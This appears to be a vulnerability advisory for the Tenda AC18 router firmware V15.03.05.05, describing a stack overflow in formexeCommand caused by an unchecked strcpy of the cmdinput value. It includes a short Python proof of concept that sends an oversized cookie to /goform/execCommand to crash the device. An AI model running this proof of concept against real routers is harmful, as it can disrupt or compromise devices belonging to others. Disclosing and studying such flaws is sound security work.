## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html
- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formexeCommand` function. The `src` variable receives the `cmdinput` parameter from a POST request and is later assigned to the `s` variable, which is fixed at 512 bytes. However, since the user can control the input of `cmdinput`, the statement `strcpy(s, src);` can cause a buffer overflow. The user-provided `cmdinput` can exceed the capacity of the `s` array, triggering this security vulnerability.

![image-20240308164307690](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308164307690.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"cmdinput=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

![image-20240308164235773](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308164235773.png)